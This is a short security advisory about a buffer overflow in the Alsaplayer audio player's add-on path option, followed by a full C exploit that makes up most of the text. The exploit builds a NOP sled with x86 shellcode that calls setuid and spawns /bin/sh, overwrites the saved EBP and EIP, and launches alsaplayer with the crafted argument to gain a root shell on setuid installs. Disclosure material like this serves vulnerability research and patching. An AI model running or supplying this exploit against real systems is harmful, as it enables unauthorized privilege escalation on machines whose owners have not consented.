source: http://www.securityfocus.com/bid/5767/info

Alsaplayer is a PCM player that utilizes the ALSA libraries and drivers. It is availabe for Linux and Unix platforms.

A vulnerability has been discovered in Alsaplayer. By specifying an overly long "add-on path", it is possible for an attacker to overrun the buffer, potentially allowing for execution of attacker-supplied code.

It should be noted that although Alsaplayer is not installed setuid by default, it is common practice for users to add a setuid bit to obtain certain functionality. 

/*
 * Alsaplayer exploit for a buffer overflow found by KF (snosoft.com)
 *
 * This program is not installed with special permissions by default.
 * However, the author himself does recommend to do so under certain
 * conditions:
 *
 * http://lists.tartarus.org/pipermail/alsaplayer-devel/2002-February/000656.html
 * http://lists.tartarus.org/pipermail/alsaplayer-devel/2002-February/000657.html
 *
 * Author: zillion[at]safemode.org (09/2002)
 *
 * Tested on Red Hat 7.3 linux with alsaplayer-devel-0.99.71-1
 *
 */

#include <unistd.h>
#include <sys/stat.h>
#include <string.h>

#define BUFFER_SIZE 1056
#define NOP 0x90
#define RET 0xbfffe440

char shellcode[]=

"\xeb\x26\x5e\x31\xc0\x89\xc3\x89\xc1\x89\xc2\xb0\xa4\xcd\x80"
"\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xd5\xff\xff\xff"
"\x2f\x62\x69\x6e\x2f\x73\x68";

void print_error(char * burb) {
  printf(" Error: %s !\n",burb); exit(0);
}

void usage(char *progname) {
  printf("\n*--- -- -  Alsaplayer b0f exploit - -- ---*\n");
  printf("\nDefault: %s  -f /path/to/alsaplayer",progname);
  printf("\nOption : %s  -o <offset>\n\n",progname);
  exit(0);
}

int main(int argc, char **argv){

  char buffer[BUFFER_SIZE];
  char file[30];
  long retaddress;
  int arg,offset=500;

  struct stat sbuf;

  if(argc < 2) { usage(argv[0]); }

  while ((arg = getopt (argc, argv, "f:o:")) != -1){
    switch (arg){
    case 'f':
      strncpy(file,optarg,sizeof(file));
      if(stat(argv[2], &sbuf)) { print_error("No such file");}
      break;
    case 'o':
      offset = atoi(optarg);
      if(offset < 0) { print_error("Offset must be positive");}
      break;
    default :
      usage(argv[0]);
    }
  }

  retaddress = (RET - offset);
  memset(buffer,NOP,BUFFER_SIZE);
  memcpy(buffer + BUFFER_SIZE - (sizeof(shellcode) + 8) ,shellcode,sizeof(shellcode) -1);

  /* Overwrite EBP and EIP */
  *(long *)&buffer[BUFFER_SIZE - 8]  = retaddress;
  *(long *)&buffer[BUFFER_SIZE - 4]  = retaddress;

  if(execl(file,file,"-p",buffer,NULL) != 0) {
    print_error("Could not execute alsaplayer ");
  }

  return 0;

}